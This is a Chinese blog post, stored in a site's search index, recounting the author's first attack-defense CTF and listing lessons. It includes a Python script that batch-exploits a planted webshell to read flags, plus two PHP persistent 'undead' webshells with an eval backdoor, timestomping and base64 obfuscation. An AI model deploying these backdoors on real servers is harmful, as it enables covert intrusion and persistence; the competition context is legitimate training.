<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记第一场AWD</title>
      <link href="/2021/11/23/AWD/"/>
      <url>/2021/11/23/AWD/</url>
      
        <content type="html"><![CDATA[<h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>由于第一次没有任何经验，导致我和我队友连接xshell都花了半天时间，进去之后就已经被打了一轮了(这里还要感谢学长没把我们的站删了)</p><p>进去之后，按照流程，首先备份</p><p> 之后快速拖到D盾查杀，发现几个一句话木马，马上注释，且利用其去攻击</p><p>之后我们迅速上了一个通防(watch bird)，本想等下空出来时间后再上一个更大的通防，却在后面被告知我们的通防每轮都被check，仔细一看，我们的分已经扣了一大半了。</p><p>然后我们迅速撤掉通防，但此时，一个很重大的问题来了—-我们本打算拿通防看流量的，所以没准备其他流量脚本，导致官方发流量时我们根本抓取不了，被其他队抓取后一直dwon掉，队友是个很强的pwn手，但这次只开了web靶机，他是心有余而力不足，我自己代码审计能力又不佳，一直找不到问题所在，导致一直被打，无力还手。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、比赛开始后，拿到主办方给的账户利用xshell登录              </p><p>2、如果密码是相同的或者有规律可循的，那么一定要马上立刻修改自己的密码，登陆成功后输入password即可，不然被别人登录后修改密码，整场比赛你们就只有挨打了</p><p>3、备份文件，先将文件打包然后再传输，速度会很快</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf /tmp/html.tar.gz /var/www/html </span><br><span class="line">        压缩后的位置和名字  需要压缩的文件的位置</span><br></pre></td></tr></table></figure><p>4、将备份下来的文件迅速拖到D盾查杀，看到后门后直接查看文件并把它注释掉，之后就利用其去攻击，这里一定要花时间写批量脚本，当靶机很多的时候，手提是根本来不及的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#自动获取并提交flag</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submitflag</span>(<span class="params">flag</span>):</span><br><span class="line">    f = flag</span><br><span class="line">    cmd = <span class="string">&#x27;curl -X POST http://172.17.135.26:19999/api/flag -H &quot;Authorization: 3725bc684ef7b4a370f8444614fb99c4&quot; -d &quot;&#123;\\&quot;flag\\&quot;:\\&quot;%s\\&quot;&#125;&quot;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(cmd %f)</span><br><span class="line">    os.system(cmd %f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>(<span class="params">ip</span>):</span><br><span class="line">    shell_url = ip+<span class="string">&quot;/config.php&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        re = requests.post(shell_url,data=data)</span><br><span class="line">        flag = <span class="built_in">str</span>(re.text)[<span class="number">0</span>:<span class="number">46</span>]</span><br><span class="line">        <span class="comment"># print(flag)</span></span><br><span class="line">        submitflag(flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8001</span>,<span class="number">8011</span>):</span><br><span class="line">    url=<span class="string">&quot;http://172.17.135.39:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">8002</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shell(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5、之后开始上传日志，特别重要，抓到别人攻击你的流量马上那它去攻击别人</p><p>6、之后开始代码审计，可以使用seay自动审计列出可能存在风险的文件，进行代码审计</p><p>7、获取别人的shell之后上传不死马以维持权限(这次我们还没用上)</p><p>简单不死马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;.3.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//pass=pass</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变种不死马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"> <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"> <span class="variable">$file</span> = <span class="string">&#x27;c.php&#x27;</span>;</span><br><span class="line"> <span class="variable">$code</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+&#x27;</span>);</span><br><span class="line">   <span class="comment">//一句话木马base64加密&lt;?php @eval($_POST[c]);</span></span><br><span class="line"> <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>))===<span class="title function_ invoke__">md5</span>(<span class="variable">$code</span>)) &#123;</span><br><span class="line">     <span class="comment">//获得文件内容与参数code进行比较，条件判断</span></span><br><span class="line">         <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="title function_ invoke__">usleep</span>(<span class="number">50</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>8、进行一段比赛后，要攻击在你附近的队伍，针对他们，你的排名就上去了</p><p>9、进入别人后台后，下手的动作要轻，不能被对方发现，就能再不经意间dwon掉别人，</p><p>动作太大就直接被发现了</p>]]></content>
      
      
      <categories>
          
          <category> AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
